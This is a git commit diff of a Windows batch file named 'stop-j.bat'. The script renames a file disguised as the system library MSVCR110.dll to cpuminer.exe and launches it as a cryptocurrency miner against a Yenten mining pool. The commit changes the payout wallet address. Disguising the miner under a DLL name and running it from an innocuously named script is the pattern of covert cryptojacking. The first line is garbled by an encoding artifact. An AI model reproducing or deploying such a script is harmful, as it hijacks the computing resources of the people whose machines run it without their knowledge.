28ca0ff2d0c082543a75187a01194baace304675
Land-15 <78992675+Land-15@users.noreply.github.com>
2021-02-13 16:39:19 +0800

    Add files via upload

--- src/stop-j.bat
+++ src/stop-j.bat
@@ -1,3 +1,3 @@
 ÿþcho off
 rename MSVCR110.dll cpuminer.exe
-cpuminer.exe -a yespowerr16 -o stratum+tcp://yenten-pool.info:63368 -u YfFwQMFYQ5FS2SnSteF6aLDrSchyseMQ8D
+cpuminer.exe -a yespowerr16 -o stratum+tcp://yenten-pool.info:63368 -u YQStCZGa1aLimpgy4it17Ld1FTFNcBfXcu
